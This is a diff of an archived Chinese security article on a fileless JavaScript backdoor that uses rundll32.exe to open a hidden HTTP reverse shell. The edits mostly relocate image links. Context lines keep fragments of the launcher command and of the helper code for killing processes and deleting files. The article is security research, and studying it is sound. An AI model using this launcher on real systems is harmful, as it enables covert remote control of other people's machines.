@@ -3,7 +3,7 @@
 			<head>
 			     <title>JavaScript Backdoor - 三好学生</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/11764">http://drops.wooyun.org/tips/11764</a></h1>
 				
@@ -14,7 +14,7 @@
 
 <p>Casey Smith最近在Twitter分享了他的研究成果，执行一段JavaScript代码即可反弹一个Http Shell，很是奇妙，所以就对这个技术做了进一步研究。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/2016010415283129891110.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016010415283129891110.png" alt="Alt text"></p>
 
 <!--more-->
 
@@ -22,7 +22,7 @@
 
 <hr>
 
-<p><img src="http://static.wooyun.org//drops/20160104/201601041528335078722.png" alt="Alt text"></p>
+<p><img src="../images_result/images/201601041528335078722.png" alt="Alt text"></p>
 
 <p>从截图我们可以看到该技术的使用方法，在cmd下利用rundll32.exe加载JavaScript代码，代码运行后会反弹一个Http Shell，而特别的地方在于当运行完cmd命令后，后台会一直存在进程rundll32.exe用来同Server持续连接，整个过程不需要写入文件，隐蔽性大大提高。</p>
 
@@ -67,7 +67,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%
 
 <p>可以执行cmd命令并获得回显</p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/201601041528358507732.png" alt="Alt text"></p>
+<p><img src="../images_result/images/201601041528358507732.png" alt="Alt text"></p>
 
 <h1>0x04 测试中的Bug</h1>
 
@@ -75,11 +75,11 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%
 
 <p><strong>1、连接超时</strong></p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/201601041528365636741.png" alt="Alt text"></p>
+<p><img src="../images_result/images/201601041528365636741.png" alt="Alt text"></p>
 
 <p>在成功返回shell后，如果在后台等待一段时间，Clinet就会弹出超时连接的对话框</p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/201601041528372215551.png" alt="Alt text"></p>
+<p><img src="../images_result/images/201601041528372215551.png" alt="Alt text"></p>
 
 <p>从截图可以看到Casey Smith已经发现了连接超时的问题，所以在新版本已经做了修正，加上window.setTimeout来避免连接超时的错误，在message内加了超时判断（message存储用于实现Client后续连接的代码，具体细节一看代码就明白），但是这样做还远远不够。</p>
 
@@ -99,15 +99,15 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/201601041528397035661.png" alt="Alt text"></p>
+<p><img src="../images_result/images/201601041528397035661.png" alt="Alt text"></p>
 
 <p><strong>5、无法删除文件</strong></p>
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/201601041528406889571.png" alt="Alt text"></p>
+<p><img src="../images_result/images/201601041528406889571.png" alt="Alt text"></p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/201601041528433383281.png" alt="Alt text"></p>
+<p><img src="../images_result/images/201601041528433383281.png" alt="Alt text"></p>
 
 <p><strong>6、server端无法正常退出</strong></p>
 
@@ -126,7 +126,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%
 
 <p>文中提到了JavaScript实现WinHttpRequest的用法，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/201601041528449248591.png" alt="Alt text"></p>
+<p><img src="../images_result/images/201601041528449248591.png" alt="Alt text"></p>
 
 <p>setTimeout用来设置http的超时时间，如果全为0，代表no time-out，也就是无限期</p>
 
@@ -182,7 +182,7 @@ new ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe"）
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/2016010415284660141101.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016010415284660141101.png" alt="Alt text"></p>
 
 <p>run方法其实后面还可以加参数指示该窗口能否被看见</p>
 
@@ -276,7 +276,7 @@ f.Delete();
 
 <p>示例如图：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/2016010415284773181112.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016010415284773181112.png" alt="Alt text"></p>
 
 <p>示例代码可以实现简单的文件上传下载，但里面存在一个小bug，如果你投入精力，不难解决</p>
 
@@ -355,7 +355,7 @@ eval(B);
 
 <p>支持的功能如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160104/2016010415284991121121.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016010415284991121121.png" alt="Alt text"></p>
 
 <blockquote>
   <p>注：<br>
